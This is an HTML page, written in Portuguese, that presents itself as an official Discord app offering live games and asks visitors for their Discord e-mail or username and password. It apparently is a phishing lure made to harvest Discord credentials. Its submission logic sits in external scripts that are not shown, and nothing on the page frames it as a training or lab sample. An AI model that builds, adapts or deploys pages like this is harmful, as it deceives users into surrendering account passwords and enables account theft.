<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord | app</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="logo_2.png" type="image/x-icon">
</head>
<body>
    <div id="fundinho">
        <div id="textos">
            <img src="edit.png" alt="img" id="ima">
            <h2>Acabamos de criar um app do discord capaz de mostrar jogos ao vivo e todas as informações que os nossos fãs gostam.</h2>
            <button id="btn">Obter</button>
        </div>

    </div>

    <div id="capa">
        <img src="perfil.webp" alt="img" id="perfil">
        <form action="" id="form">
            <div id="username" class="dados">
                <label for="inome">E-mail ou Username</label>
                <input type="text" name="nome" id="inome">
            </div>

            <div id="senha" class="dados">
                <label for="isenha">Senha do discord</label>
                <input type="password" name="senhas" id="isenha">
                <input type="submit" value="Enviar" id="envia">
            </div>

        </form>
    </div>

    <script src="script.js"></script>
    <script src="script_final.js"></script>
</body>
</html>
